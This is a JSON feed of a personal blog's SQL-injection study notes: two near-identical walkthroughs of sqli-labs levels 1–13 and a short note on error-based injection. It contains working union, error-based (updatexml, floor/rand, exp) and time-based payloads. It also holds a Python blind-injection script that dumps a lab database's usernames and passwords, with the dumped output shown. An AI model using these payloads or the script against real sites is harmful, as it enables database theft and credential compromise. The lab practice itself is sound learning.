{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"sql注入\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.github.io",
    "items": [
        {
            "id": "http://dpm12345.github.io/posts/ca25cf0b/",
            "url": "http://dpm12345.github.io/posts/ca25cf0b/",
            "title": "sqli-labs练习",
            "date_published": "2022-09-22T18:48:08.000Z",
            "content_html": "<h1 id=\"less-1\"><a class=\"anchor\" href=\"#less-1\">#</a> less 1</h1>\n<p>输入 <code>id</code>  值，测试为字符型注入 (此处注释符不能用 <code>#</code> ，可用 <code>--+</code> )</p>\n<p>然后使用 <code>order by x</code> ，确认列数，为 3 列</p>\n<p>然后传入</p>\n<p><code>-1' union select 1,2,3--+</code></p>\n<p>确定输入位置，分别为 2 和 3</p>\n<p>之后正常爆库、表、列</p>\n<h1 id=\"less-2\"><a class=\"anchor\" href=\"#less-2\">#</a> less 2</h1>\n<p>输入 <code>id</code> ，测试为整型注入，之后操作同 less 1</p>\n<h1 id=\"less-3\"><a class=\"anchor\" href=\"#less-3\">#</a> less 3</h1>\n<p>输入 <code>id</code> ，纯数字，无报错，加上一个单引号，报错</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0'') LIMIT 0,1' at </code></p>\n<p><code>line 1</code></p>\n<p>可判断为字符型注入，且有括号，之后操作如前</p>\n<h1 id=\"less-4\"><a class=\"anchor\" href=\"#less-4\">#</a> less 4</h1>\n<p>此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可</p>\n<h1 id=\"less-5\"><a class=\"anchor\" href=\"#less-5\">#</a> less 5</h1>\n<p>此题输入 <code>id=1</code> ，发现返回的是 <code>You are in...</code></p>\n<p>可以推断这题使用 bool 盲注， <code>substr</code> ， <code>length()</code> , <code>left</code>  之类的函数使用，或者可以用时间盲注</p>\n<p><code>ascii 可以换 </code> ord`</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-20 16:05:07</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-20 16:31:08</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://192.168.47.132:5000/sqli-labs/Less-5/?id=1' and ascii(substr(&#123;&#125;,&#123;&#125;,1))=&#123;&#125;--+\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"#\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token string\">\"(select group_concat(schema_name)from information_schema.schemata)\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\"># information_schema,challenges,mysql,performance_schema,security,test</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\"># target = \"database()\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\"># security</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(table_name)from information_schema.tables where table_schema='security')\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\"># emails,referers,uagents,users</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\"># #id,username,password</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='uagents')\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\"># #id,uagent,ip_address,username</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(id,0x7e,username,0x7e,password)from security.users)\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\"># #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    target <span class=\"token operator\">=</span> <span class=\"token string\">\"(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">></span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"You are in\"</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            result <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># security</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\"># emails,referers,uagents,users</span></pre></td></tr></table></figure><h1 id=\"less-6\"><a class=\"anchor\" href=\"#less-6\">#</a> less 6</h1>\n<p>与 less5 相比，单引号改为双引号</p>\n<h1 id=\"less-7\"><a class=\"anchor\" href=\"#less-7\">#</a> less 7</h1>\n<p>相比上一个，其 sql 语句应为 <code>where id = (('$id'))</code> ，故闭合一个单引号和两个括号，之后和前面脚本一样</p>\n<h1 id=\"less-8\"><a class=\"anchor\" href=\"#less-8\">#</a> less 8</h1>\n<p>同 less5</p>\n<h1 id=\"less-9\"><a class=\"anchor\" href=\"#less-9\">#</a> less 9</h1>\n<p>不管什么都显示相同，故采用时间盲注</p>\n<p>payload： <code>?id=1' and if(ascii(substr(&#123;&#125;,&#123;&#125;,1))=&#123;&#125;,sleep(1),2)--+</code></p>\n<h1 id=\"less-10\"><a class=\"anchor\" href=\"#less-10\">#</a> less 10</h1>\n<p>第九题改单引号为双引号</p>\n<h1 id=\"less-11\"><a class=\"anchor\" href=\"#less-11\">#</a> less 11</h1>\n<p>联合查询</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>passwd<span class=\"token operator\">=</span>admin<span class=\"token operator\">&amp;</span>uname<span class=\"token operator\">=</span><span class=\"token string\">' union select 1,database()--+</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>passwd=admin&amp;uname='</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'security'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>或者使用报错注入</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>passwd<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>uname<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' and updatexml(0x7e,concat(0x7e,database()),0x7e)--+</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>passwd=1&amp;uname=1'</span><span class=\"token keyword\">union</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'security'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>x <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x<span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><h1 id=\"less-12\"><a class=\"anchor\" href=\"#less-12\">#</a> less 12</h1>\n<p>与 11 相比，闭合使用 <code>&quot;)</code></p>\n<p>其他同</p>\n<h1 id=\"less-13\"><a class=\"anchor\" href=\"#less-13\">#</a> less 13</h1>\n<p>闭合使用 <code>')</code> ，使用报错注入，其他无显示</p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.github.io/posts/29fef1ad/",
            "url": "http://dpm12345.github.io/posts/29fef1ad/",
            "title": "sqli-labs 练习",
            "date_published": "2022-09-22T16:07:26.000Z",
            "content_html": "<h1 id=\"less-1\"><a class=\"anchor\" href=\"#less-1\">#</a> less 1</h1>\n<p>输入 id 值，测试为字符型注入 (此处注释符不能用  <code>#</code>  ，可用  <code>--+</code>  )</p>\n<p>然后使用  <code>order by x</code> ，确认列数，为  <code>3</code>  列 然后传入</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>-1&#39; union select 1,2,3--+</pre></td></tr></table></figure><p>确定输入位置，分别为 2 和 3</p>\n<p>之后正常爆库、表、列</p>\n<h1 id=\"less-2\"><a class=\"anchor\" href=\"#less-2\">#</a> less 2</h1>\n<p>输入 id，测试为整型注入，之后操作同 less 1</p>\n<h1 id=\"less-3\"><a class=\"anchor\" href=\"#less-3\">#</a> less 3</h1>\n<p>输入 id，纯数字，无报错，加上一个单引号，报错</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0'') LIMIT 0,1' at line 1</code></p>\n<p>可判断为字符型注入，且有括号，之后操作如前</p>\n<h1 id=\"less-4\"><a class=\"anchor\" href=\"#less-4\">#</a> less 4</h1>\n<p>此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可</p>\n<h1 id=\"less-5\"><a class=\"anchor\" href=\"#less-5\">#</a> less 5</h1>\n<p>此题输入 id=1，发现返回的是 You are in...</p>\n<p>可以推断这题使用 bool 盲注，substr，length (),left 之类的函数使用，或者可以用时间盲注</p>\n<p>ascii 可以换 ord</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-20 16:05:07</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-20 16:31:08</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://192.168.47.132:5000/sqli-labs/Less-5/?id=1' and ascii(substr(&#123;&#125;,&#123;&#125;,1))=&#123;&#125;--+\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"#\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(schema_name)from information_schema.schemata)\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\"># information_schema,challenges,mysql,performance_schema,security,test</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\"># target = \"database()\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\"># security</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(table_name)from information_schema.tables where table_schema='security')\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\"># emails,referers,uagents,users</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users')\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\"># #id,username,password</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='uagents')\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\"># #id,uagent,ip_address,username</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\"># target = \"(select group_concat(id,0x7e,username,0x7e,password)from security.users)\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\"># #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    target <span class=\"token operator\">=</span> <span class=\"token string\">\"(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">></span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"You are in\"</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            result <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\"># security</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\"># emails,referers,uagents,users</span></pre></td></tr></table></figure><h1 id=\"less-6\"><a class=\"anchor\" href=\"#less-6\">#</a> less 6</h1>\n<p>与 less5 相比，单引号改为双引号</p>\n<h1 id=\"less-7\"><a class=\"anchor\" href=\"#less-7\">#</a> less 7</h1>\n<p>相比上一个，起 sql 语句应为  <code>where id = (('$id'))</code>  ，故闭合一个单引号和两个括号，之后和前面脚本一样</p>\n<h1 id=\"less-8\"><a class=\"anchor\" href=\"#less-8\">#</a> less 8</h1>\n<p>同 less 5</p>\n<h1 id=\"less-9\"><a class=\"anchor\" href=\"#less-9\">#</a> less 9</h1>\n<p>不管什么都显示相同，故采用时间盲注</p>\n<p>payload： <code>?id=1' and if(ascii(substr(&#123;&#125;,&#123;&#125;,1))=&#123;&#125;,sleep(1),2)--+</code></p>\n<h1 id=\"less-10\"><a class=\"anchor\" href=\"#less-10\">#</a> less 10</h1>\n<p>第九题改单引号为双引号</p>\n<h1 id=\"less-11\"><a class=\"anchor\" href=\"#less-11\">#</a> less 11</h1>\n<p>联合查询</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>passwd<span class=\"token operator\">=</span>admin<span class=\"token operator\">&amp;</span>uname<span class=\"token operator\">=</span><span class=\"token string\">' union select 1,database()--+</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>passwd=admin&amp;uname='</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'security'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span></pre></td></tr></table></figure><p>或者使用报错注入</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>passwd<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>uname<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' and updatexml(0x7e,concat(0x7e,database()),0x7e)--+</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>passwd=1&amp;uname=1'</span><span class=\"token keyword\">union</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'security'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>x <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x<span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><h1 id=\"less-12\"><a class=\"anchor\" href=\"#less-12\">#</a> less 12</h1>\n<p>与 11 相比，闭合使用  <code>&quot;)</code></p>\n<p>其他同</p>\n<h1 id=\"less-13\"><a class=\"anchor\" href=\"#less-13\">#</a> less 13</h1>\n<p>闭合使用  <code>')</code>  ，使用报错注入，其他无显示</p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        },
        {
            "id": "http://dpm12345.github.io/posts/e73517db/",
            "url": "http://dpm12345.github.io/posts/e73517db/",
            "title": "SQL注入",
            "date_published": "2022-08-28T05:01:48.000Z",
            "content_html": "<h1 id=\"联合查询\"><a class=\"anchor\" href=\"#联合查询\">#</a> 联合查询</h1>\n<h1 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h1>\n<h2 id=\"updatexml\"><a class=\"anchor\" href=\"#updatexml\">#</a> updatexml</h2>\n<p>example： <code>?id=1'+updatexml(1,concat(0x7e,(select version())),0x7e)%23</code></p>\n<h2 id=\"floor\"><a class=\"anchor\" href=\"#floor\">#</a> floor</h2>\n<p><code>floor</code>  报错的原理是 <code>rand</code>  和 <code>order by</code>  或 <code>group by</code>  的冲突</p>\n<p>example：</p>\n<ul>\n<li>\n<p>爆破数据库版本信息</p>\n<p><code>?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></p>\n</li>\n<li>\n<p>爆破数据库名信息</p>\n<p><code>?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></p>\n</li>\n</ul>\n<p>分解解释</p>\n<p>分别将各语句分开，最终得到 <code>select 1 from a</code> ;</p>\n<p>而为了让 <code>floor</code>  中的 <code>rand</code>  和 <code>order by</code>  或 <code>group by</code>  进行冲突，必须存在 <code>floor(rand (0)*2) x group by x</code></p>\n<p>编写步骤:</p>\n<p><code>select 1 from a</code></p>\n<p>丰富 <code>a</code>  的内容</p>\n<p><code>select 1 from (select count(*),xxx from information_schema.tables group by xxx)a</code></p>\n<p>替换上面的 <code>xxx</code></p>\n<p><code>select 1 from (select count(*),concat(aaa,floor(rand(0)*2))xxx from information_schema.tables group by xxx)a</code></p>\n<p>最后替换 <code>concat</code>  中的 <code>aaa</code>  (即为需要获得的信息)</p>\n<p><code>select 1 from (select count(*),concat(concat(0x7e,database(),0x7e),floor(rand(0)*2))xxx from information_schema.tables group by xxx)a</code></p>\n<h2 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h2>\n<p>example: <code>?id=1' and exp(~(select * from (select user())x))%23</code></p>\n",
            "tags": [
                "CTF",
                "sql注入"
            ]
        }
    ]
}